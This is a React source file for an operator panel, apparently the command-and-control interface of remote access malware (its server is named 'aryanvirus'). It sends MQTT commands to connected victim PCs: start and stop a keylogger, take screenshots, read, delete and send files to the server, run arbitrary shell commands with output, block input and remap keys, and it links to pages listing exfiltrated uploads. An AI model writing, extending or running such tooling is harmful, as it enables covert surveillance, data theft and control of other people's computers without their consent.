import React, { useEffect, useState } from "react";
import mqtt from "mqtt";
import "./Home.css";
import Keyboard from "./Keyboard";
import MouseTouchpad from "./MouseTouchPad";


export default function App() {
  const [client, setClient] = useState(null);
  const [connected, setConnected] = useState(false);
  const [log, setLog] = useState([]);
  const [clients, setClients] = useState({});
  const [selectedClient, setSelectedClient] = useState("");
  const [inputValue, setInputValue] = useState("");
  const [heartEffect, setHeartEffect] = useState(false);
  const [confirmEnabled, setConfirmEnabled] = useState(true);

const uploadfile = (e)=>{
      const file = e.target.files[0];
      if(!file) return alert("Please select file first")
      const form = new FormData();
      form.append("screenshot",file);

      fetch("https:aryanvirus.onrender.com/upload",{
        method:"POST",
        body:form
      })
      .then((res)=>res.text()
      .then(alert("File uploaded"))
      .catch(alert("Upload Failed")));
}

  const [panel,setPanel] = useState(0)

  const BROKER = import.meta.env.VITE_EMQX_BROKER

  // MQTT connection
  useEffect(() => {
    const options = {
      username: import.meta.env.VITE_EMQX_USERNAME,
      password: import.meta.env.VITE_EMQX_PASSWORD,
      reconnectPeriod: 2000,  
      clean: true,
    };

    const mqttClient = mqtt.connect(BROKER, options);
    setClient(mqttClient);

    mqttClient.on("connect", () => {
      setConnected(true);
      mqttClient.subscribe("heartbeat/+"); // heartbeat subscription
      mqttClient.subscribe("ack/+"); // ack subscription
      mqttClient.subscribe("control/broadcast"); // broadcast support
      setLog(prev => [...prev, "Connected to MQTT broker"]);
    });

    mqttClient.on("message", (topic, message) => {
      if (topic.startsWith("heartbeat/")) {
        const clientId = topic.split("/")[1];
        setClients(prev => ({ ...prev, [clientId]: Date.now() }));
      } else {
        setLog(prev => [...prev, `ACK: ${message.toString()}`]);
      }
    });

    mqttClient.on("error", (err) => {
      setLog(prev => [...prev, "Error: " + err.message]);
    });

    return () => mqttClient.end();
  }, []);

  // Mark offline clients
  useEffect(() => {
    const interval = setInterval(() => {
      const now = Date.now();
      setClients(prev => {
        const updated = { ...prev };
        for (let id in updated) {
          if (!updated[id] || now - updated[id] > 30000) updated[id] = null;
        }
        return updated;
      });
    }, 5000);
    return () => clearInterval(interval);
  }, []);

  // Send command
  const sendCommand = (command, requiresInput) => {
    if (!client) return;
    if (requiresInput && !inputValue.trim()) {
      alert("Input cannot be empty!");
      return;
    }
    if (confirmEnabled) {
      if (!window.confirm(`Send command: ${command}? To : [ ${client} ]`)) return;
    }

    // Broadcast or individual
    if (selectedClient === "broadcast") {
      Object.keys(clients).forEach(id => {
        if (clients[id]) client.publish(`control/${id}`, command.trim());
      });
      // client.publish("control/broadcast", command.trim());
    } else {
      const target = selectedClient || "broadcast";
      client.publish(`control/${target}`, command.trim());
    }

    setLog(prev => [...prev, `Sent to ${selectedClient || "broadcast"}: ${command}`]);
  };

  return (
    <div className="container">
      <h2>PC Remote Control</h2>
      <p>
        Status: {connected ? "🟢 Connected" : "🔴 Disconnected"} | Clients Online:{" "}
        {Object.values(clients).filter(ts => ts).length}
      </p>
      
      <div className="top-controls">
        <select value={selectedClient} onChange={e => setSelectedClient(e.target.value)}>
          <option value="">Select Client</option>
          {Object.entries(clients).map(([id, ts]) => (
            <option key={id} value={id}>{id} {ts ? "🟢" : "🔴"}</option>
          ))}
          <option value="broadcast">Broadcast</option>
        </select>

        <input value={inputValue} onChange={e => setInputValue(e.target.value)} placeholder="Type value..." />
        <button style={{backgroundColor:"#8a5249ff",marginLeft:10}} onClick={() => {
  setInputValue("")
}}>Clear</button>

        <label className="custom-checkbox">
          <input type="checkbox" checked={heartEffect} onChange={e => setHeartEffect(e.target.checked)} />
          <span>Heart Effect</span>
        </label>

        <label className="custom-checkbox">
          <input type="checkbox" checked={confirmEnabled} onChange={e => setConfirmEnabled(e.target.checked)} />
          <span>Confirm Before Send</span>
        </label>
        <button style={{backgroundColor:"#c52b2bff",marginLeft:10}} onClick={() => {
  localStorage.removeItem("auth");
  window.location.href = "/";
}}>Logout</button>
<div>
  <button style={{backgroundColor:"#384a49ff",marginLeft:10}} onClick={() => {
  setPanel(0)
}}>Controls</button>
<button style={{backgroundColor:"#5d2a5fff",marginLeft:10}} onClick={() => {
  setPanel(1)
}}>Keyboard & Mouse</button>
<button style={{backgroundColor:"#533f26ff",marginLeft:10}} onClick={() => {
  setPanel(2)
}}>Hide</button>
</div>
      </div>
      {panel==0?<div>
      {/* PC Controls */}
      <div className="controls-group">
        <strong>PC Controls</strong>
        <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`${inputValue}`, true)}>Manual</button>
        <button style={{ backgroundColor: "#e67e22" }} onClick={() => sendCommand("shutdown", false)}>Shutdown</button>
        <button style={{ backgroundColor: "#f39c12" }} onClick={() => sendCommand("lock", false)}>Lock</button>
        <button style={{ backgroundColor: "#2980b9" }} onClick={() => sendCommand("desktop", false)}>Show Desktop</button>
        <button style={{ backgroundColor: "#8e44ad" }} onClick={() => sendCommand("close", false)}>Close Window</button>
        <button style={{ backgroundColor: "#f1c40f" }} onClick={() => sendCommand("screenshot", false)}>Screenshot</button>
        <button style={{ backgroundColor: "#f1c40f" }} onClick={() => sendCommand("urlwallpaper https://aryanvirus.onrender.com/latestupload", false)}>LU Wallpaper</button>
        <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`urlwallpaper ${inputValue}`, true)}>URL Wallpaper</button>
        <button style={{ backgroundColor: "#f1160fff" }} onClick={() => sendCommand("startkeylog", false)}>Start KeyLog</button>
        <button style={{ backgroundColor: "#38f10fff" }} onClick={() => sendCommand("stopkeylog", false)}>Stop KeyLog</button>
        <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`playtone 2500 500`, false)}>Beep</button>
        <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`playtone ${inputValue}`, true)}>Play Tone</button>
        <button style={{ backgroundColor: "#6dca34ff" }} onClick={() => sendCommand("displayoff", false)}>Display Off</button>
        <button style={{ backgroundColor: "#9c15eaff" }} onClick={() => sendCommand("displayon", false)}>Display On</button>
        <button style={{ backgroundColor: "#6dca34ff" }} onClick={() => sendCommand("mutevolume", false)}>Mute Volume</button>
        <button style={{ backgroundColor: "#9c15eaff" }} onClick={() => sendCommand("fullvolume", false)}>Full Volume</button>
        <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`listfolder ${inputValue}`, true)}>List Folder</button>
        <button style={{ backgroundColor: "#2fc853ff" }} onClick={() => sendCommand(`createfile ${inputValue}`, true)}>Create File</button>
        <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`readfile ${inputValue}`, true)}>Read File</button>
        <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`deletefile ${inputValue}`, true)}>Delete File</button>
        <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`sendtoserver ${inputValue}`, true)}>Send To Server</button>
        <button style={{ backgroundColor: "#ab7563ff" }} onClick={() => sendCommand("restart", false)}>Restart Script</button>
        <button style={{ backgroundColor: "#7f8c8d" }} onClick={() => sendCommand("end", false)}>End Script</button>
      </div>

      {/* Input & Alerts */}
      <div className="controls-group">
        <strong>Input & Alerts</strong>
        <button style={{ backgroundColor: "#e74c3c" }} onClick={() => sendCommand("block", false)}>Block Both</button>
        <button style={{ backgroundColor: "#c0392b" }} onClick={() => sendCommand("blockkeyboard", false)}>Block Keyboard</button>
        <button style={{ backgroundColor: "#c0392b" }} onClick={() => sendCommand("blockmouse", false)}>Block Mouse</button>
        <button style={{ backgroundColor: "#27ae60" }} onClick={() => sendCommand("unblock", false)}>Unblock All</button>
        <button style={{ backgroundColor: "#e84393" }} onClick={() => sendCommand(`notepadtype${heartEffect ? "heart" : ""} ${inputValue}`, true)}>Notepad Type</button>
        <button style={{ backgroundColor: "#ae274fff" }} onClick={() => sendCommand("drawheart", false)}>Draw Heart</button>
        <button style={{ backgroundColor: "#d35400" }} onClick={() => sendCommand(`alertprompt ${inputValue}`, true)}>Alert Prompt</button>
        <button style={{ backgroundColor: "#e67e22" }} onClick={() => sendCommand(`inputprompt ${inputValue}`, true)}>Input Prompt</button>
        <button style={{ backgroundColor: "#16a085" }} onClick={() => sendCommand(`type ${inputValue}`, true)}>Type</button>
        <button style={{ backgroundColor: "#3498db" }} onClick={() => sendCommand(`press ${inputValue}`, true)}>Press Key</button>
        <button style={{ backgroundColor: "#2ecc71" }} onClick={() => sendCommand(`backspace ${inputValue}`, true)}>Backspace</button>
        <button style={{ backgroundColor: "#9b59b6" }} onClick={() => sendCommand(`remap ${inputValue}`, true)}>Remap Key</button>
          <button style={{ backgroundColor: "#2ecc71" }} onClick={() => sendCommand(`keydown ${inputValue}`, true)}>KeyDown</button>
        <button style={{ backgroundColor: "#9b59b6" }} onClick={() => sendCommand(`keyup ${inputValue}`, true)}>KeyUp</button>
        <button style={{ backgroundColor: "#59a0b6ff" }} onClick={() => sendCommand(`startrandommove`, false)}>Start Random Mouse</button>
        <button style={{ backgroundColor: "#59a0b6ff" }} onClick={() => sendCommand(`stoprandommove`, false)}>Stop Random Mouse</button>
        <button style={{ backgroundColor: "#8e44ad" }} onClick={() => sendCommand(`swapkey ${inputValue}`, true)}>Swap Key</button>
        <button style={{ backgroundColor: "#9b59b6" }} onClick={() => sendCommand(`browser ${inputValue}`, true)}>Open Browser</button>
        <button style={{ backgroundColor: "#5e4c34ff" }} onClick={() => sendCommand(`cmdwithoutput ${inputValue}`, true)}>Output Subprocess</button>
      </div>

      {/* Server access */}

      <div className="controls-group">
        <strong>Server Links</strong>
        <button style={{ backgroundColor: "#2980b9" }} onClick={() => window.open("https://aryanvirus.onrender.com/trace")}>Trace</button>
        <button style={{ backgroundColor: "#8e44ad" }} onClick={() => window.open("https://aryanvirus.onrender.com/listuploads")}>List Uploads</button>
        <button style={{ backgroundColor: "#f1c40f" }} onClick={() => window.open("https://aryanvirus.onrender.com/latestupload")}>Latest Upload</button>
        <button style={{ backgroundColor: "#7f8c8d" }} onClick={() => window.open("https://aryanvirus.onrender.com/showuploads")}>All Uploads</button>
        <button style={{ backgroundColor: "#7f8c8d" }} onClick={() => window.open("https://aryanvirus.onrender.com/showuploads_new")}>All File Uploads</button>
        <input type="file" onChange={uploadfile} style={{ backgroundColor: "#7f8c8d" }}/>
      </div>
</div>:panel==1?<div><Keyboard sendCommand={sendCommand}/>
<MouseTouchpad sendCommand={sendCommand}/></div>:null}
<button style={{backgroundColor:"#2bc535ff"}} onClick={() => {
  setLog([])
}}>Clear Log</button>
      <div className="logs">
  <h3>Logs</h3>
  {log.map((l, i) => (
    <pre
      key={i}
      style={{
        border: "1px solid #595959ff",
        padding: 5,
        marginBottom: 5,
        whiteSpace: "pre-wrap",
      }}
    >
      {l.replace(/\\n/g, "\n")} 
    </pre>
  ))}
</div>

    </div>
  );
}
